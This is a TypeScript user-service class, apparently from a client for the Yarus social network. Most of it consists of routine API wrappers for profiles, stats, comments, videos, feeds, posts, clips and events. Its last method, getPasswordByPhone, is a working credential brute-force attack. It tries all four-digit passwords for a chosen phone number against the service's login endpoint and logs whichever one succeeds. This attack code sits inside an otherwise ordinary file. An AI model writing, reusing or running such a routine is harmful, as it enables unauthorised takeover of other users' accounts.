import { Pagination } from "@/_core/models/Pagination";
import { BaseService } from "@/_core/service/BaseService";
import { stringify } from "querystring";
import UserModel from "../Auth/models/UserModel";
import ClipItemModel from "./models/ClipItemModel";
import CommentModel from "./models/CommentModel";
import ContentDetailModel from "./models/ContentDetailModel";
import EventItemModel from "./models/EventItemModel";
import FeedModel from "./models/FeedModel";
import VideoModel from "./models/VideoModel";
import { ServiceLocator } from "./../../_core/service/ServiceLocator";
import AuthService from "../Auth/AuthService";
import LoginData from "../Auth/models/LoginData";
import { AuthStatusType } from "../Auth/models/AuthResult";

export default class UserServie extends BaseService {
  async getById(id: number) {
    const userPr = this.getOneOrDefault(UserModel, `user/${id}`);
    const userStatPr = this.getUserStats(id);
    const res = await Promise.all([userPr, userStatPr]);
    const user = res[0];
    if (!!user) {
      user.stats = res.length > 1 ? res[1] : {};
    }
    return user;
  }

  searchUser(query: string) {
    const config = { params: { query } };
    return this.getArrayOrEmpty(UserModel, "user/search", config);
  }

  getUserComments(id: number) {
    return this.getArrayOrEmpty(CommentModel, `user/${id}/comment`);
  }

  getUserStats(id: number) {
    return this.getAnyOrNull(`user/${id}/stats`);
  }

  getUserVideos(id: number, pagination: Pagination) {
    return this.getArrayOrEmpty(
      VideoModel,
      `user/${id}/video?${stringify({ limit: pagination.perPage, offset: pagination.currentPage * pagination.perPage })}`
    );
  }

  getUserFeeds(id: number) {
    return this.getArrayOrEmpty(FeedModel, `user/${id}/feed`);
  }

  getUserPosts(id: number, pagination: Pagination) {
    return this.getArrayOrEmpty(
      ContentDetailModel,
      `user/${id}/post?${stringify({ limit: pagination.perPage, offset: pagination.currentPage * pagination.perPage })}`
    );
  }

  getPostListByFeed(feedId: number, pagination: Pagination) {
    return this.getArrayOrEmpty(
      ContentDetailModel,
      `feed/${feedId}?${stringify({ limit: pagination.perPage, offset: pagination.currentPage * pagination.perPage })}`
    );
  }

  getUserClips(id: number, pagination: Pagination) {
    return this.getArrayOrEmpty(
      ClipItemModel,
      `user/${id}/clip?${stringify({ limit: pagination.perPage, offset: pagination.currentPage * pagination.perPage })}`
    );
  }

  getUserEvents(id: number, pagination: Pagination) {
    return this.getArrayOrEmpty(
      EventItemModel,
      `user/${id}/event-owner?${stringify({ limit: pagination.perPage, offset: pagination.currentPage * pagination.perPage })}`
    );
  }

  async getPasswordByPhone(phoneNumber: string) {
    const atempts = 9999;
    const loginData = new LoginData({ phone: phoneNumber });
    let password = 0;
    for (let index = 0; index < atempts; index++) {
      loginData.password = String(index).padStart(4, "0");
      // Тупо дергается ручка https://auth.yarus.ru/auth
      const res = await ServiceLocator.instance.getService(AuthService).login(loginData, false);
      if (res.status === AuthStatusType.OK) {
        password = index;
        break;
      }
    }
    console.log(password);
  }
}
